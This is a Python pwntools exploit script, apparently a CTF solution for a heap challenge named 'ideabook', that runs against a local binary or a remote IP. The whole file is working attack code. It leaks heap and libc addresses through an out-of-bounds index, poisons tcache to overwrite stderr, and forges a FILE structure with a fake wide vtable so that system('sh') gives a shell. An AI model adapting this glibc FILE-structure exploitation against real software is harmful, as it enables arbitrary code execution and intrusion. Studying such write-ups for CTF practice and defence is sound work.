#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./ideabook_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 17253)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def create(index: int, size: int):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"Index: ", str(index).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        return

    def edit(index: int, data: bytes, line=True):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"Index: ", str(index).encode())
        if line:
            io.sendlineafter(b"Content: ", data)
        else:
            io.sendafter(b"Content: ", data)
        return

    def read(index: int) -> bytes:
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"Index: ", str(index).encode())
        io.recvuntil(b"Content: ")
        data = io.recvuntil(b">", drop=True)
        io.unrecv(b">")
        return data

    def delete(index: int):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"Index: ", str(index).encode())
        return

    create(0x10, 0)
    create(0, 0x18)
    create(1, 0x18)
    delete(1)

    leak = read(0x10)
    heap_base = ptr.u64(leak[0x40:0x48]) << 12
    tcache_random_value = ptr.u64(leak[0x48:0x50])
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    for i in range(1, 7):
        create(i, 0xF8)

    payload = b""
    payload += ptr.p64(0) * 3
    payload += ptr.p64(0x21)
    payload += ptr.p64(0) * 3
    payload += ptr.p64(0x21)
    payload += ptr.p64(heap_base >> 12)
    payload += ptr.p64(tcache_random_value)
    payload += ptr.p64(0)
    payload += ptr.p64(0x501)

    edit(0x10, payload)

    delete(1)

    leak = read(0x10)
    libc.base = ptr.u64(leak[0x60:0x68]) - unwrap(libc.symbol("main_arena")) - 96

    delete(2)
    delete(3)

    leak = read(0x10)
    payload = b""
    payload += leak[0:0x260]
    payload += ptr.p64(
        (heap_base + 0x500) >> 12 ^ unwrap(libc.symbol("_IO_2_1_stderr_"))
    )
    payload += leak[0x268:0x270]

    edit(0x10, payload)

    create(2, 0xF8)
    create(3, 0xF8)

    fake_wide_vtable_addr = heap_base + 0x700
    fake_wide_vtable = b""
    # _wide_vtable->doallocate = RIP
    fake_wide_vtable = fake_wide_vtable.ljust(0x68, b"\0")
    fake_wide_vtable += ptr.p64(unwrap(libc.symbol("system")))
    assert b"\n" not in fake_wide_vtable

    fake_wide_data_addr = heap_base + 0x600
    fake_wide_data = b""
    # _wide_data->_IO_write_base = 0
    fake_wide_data = fake_wide_data.ljust(0x18, b"\0")
    fake_wide_data += ptr.p64(0)
    # _wide_data->_IO_buf_base = 0
    fake_wide_data = fake_wide_data.ljust(0x30, b"\0")
    fake_wide_data += ptr.p64(0)
    # _wide_data->_wide_vtable = &fake_wide_vtable
    fake_wide_data = fake_wide_data.ljust(0xE0, b"\0")
    fake_wide_data += ptr.p64(fake_wide_vtable_addr)
    assert b"\n" not in fake_wide_data

    stdout = unwrap(libc.symbol("_IO_2_1_stdout_"))
    file = b""
    # file->_flags = "  sh;"
    file += ptr.p64(ptr.u64("  sh;"))
    # assert ptr.u64(file) & 0x0008 == 0 and ptr.u64(file) & 0x0800 == 0
    # file->_IO_write_ptr > file->_IO_write_base
    file = file.ljust(0x28, b"\0")
    file += ptr.p64(1)
    # stderr->_wide_data = &fake_wide_data
    file = file.ljust(0xA0, b"\0")
    file += ptr.p64(fake_wide_data_addr)
    # stderr->vtable = &IO_wfile_jumps
    file = file.ljust(0xD8, b"\0")
    file += ptr.p64(unwrap(libc.symbol("_IO_wfile_jumps")))
    payload = b""
    payload += file
    payload += ptr.p64(0x800)
    payload += ptr.p64(stdout + 131)
    payload += ptr.p64(stdout + 131)
    assert b"\n" not in file

    edit(4, fake_wide_data)
    edit(5, fake_wide_vtable)
    edit(3, payload[:-1], line=False)

    io.sendlineafter(b"> ", b"5")

    io.interactive()

    return


if __name__ == "__main__":
    main()
